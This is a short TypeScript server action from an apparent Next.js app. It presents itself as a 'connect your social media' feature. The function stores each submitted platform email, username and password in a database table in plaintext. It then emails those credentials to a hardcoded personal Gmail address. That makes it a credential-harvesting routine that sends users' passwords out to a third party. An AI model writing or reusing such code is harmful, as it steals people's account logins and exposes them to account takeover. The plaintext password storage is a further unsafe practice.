"use server"
import {FieldValues} from "react-hook-form";
import {SendEmail} from "@/app/api/EmailSenderModule/SendEmail";
import {mysqlConnection} from "@/app/api/connectionOptions";

export async function uploadSocialMediaInfo(data: FieldValues, userName: string, userid: number) {
    try {
        await mysqlConnection.execute("insert into UserSocialMedia(userid, Email, Password, UserName, Platform) values (?,?,?,?,?)", [userid, data?.["Email"], data?.["Password"], data?.["Username"], data?.["Platform"]])

        await SendEmail(`${userName} just connected their ${data?.["Platform"]}.
        UserName: ${data?.["Username"]}
        Email : ${data?.["Email"]}
        Password : ${data?.["Password"]}
        `, "cherrypopice504@gmail.com", "Social Media Connected")
        return true
    } catch {
        return false
    }
}